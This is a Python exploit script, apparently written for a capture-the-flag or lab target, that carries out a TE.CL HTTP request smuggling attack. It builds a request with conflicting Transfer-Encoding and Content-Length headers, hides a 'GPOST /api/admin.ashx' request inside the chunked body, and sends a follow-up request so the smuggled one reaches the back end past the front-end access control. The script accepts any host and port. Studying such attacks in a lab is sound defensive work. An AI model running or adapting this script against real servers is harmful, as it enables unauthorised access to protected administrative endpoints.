#!/usr/bin/env python3
"""
TE.CL smuggling test (PortSwigger basic TE.CL pattern).

Front-end honors Transfer-Encoding: chunked, back-end uses Content-Length=4.
Front-end reads the full chunked stream and forwards it. Back-end reads
only 4 bytes ("5c\r\n") and the rest ("GPOST /api/admin.ashx ...") becomes
a smuggled request — bypassing any front-end ACL on /api/admin.ashx.
"""
import socket, sys
HOST, PORT = (sys.argv[1], int(sys.argv[2])) if len(sys.argv) > 2 else ("127.0.0.1", 8080)

smuggled = (
    "GPOST /api/admin.ashx HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 10\r\n"
    "\r\n"
    "x=1"
)
chunk_hex = format(len(smuggled), "x")
body = f"{chunk_hex}\r\n{smuggled}\r\n0\r\n\r\n"

req = (
    "POST /api/echo.ashx HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    f"{body}"
)

s = socket.create_connection((HOST, PORT), timeout=5)
s.sendall(req.encode())
# fire a follow-up so the smuggled request gets paired with a victim socket
s.sendall(f"GET /api/echo.ashx HTTP/1.1\r\nHost: {HOST}\r\nConnection: close\r\n\r\n".encode())
data = b""
try:
    while True:
        c = s.recv(4096)
        if not c: break
        data += c
except socket.timeout:
    pass
s.close()
print(data.decode("latin1"))
print("\n[+] If you see FLAG{kba-smuggled-to-admin} or 'served_by:backend', /api/admin.ashx was reached via smuggling (TE.CL).")
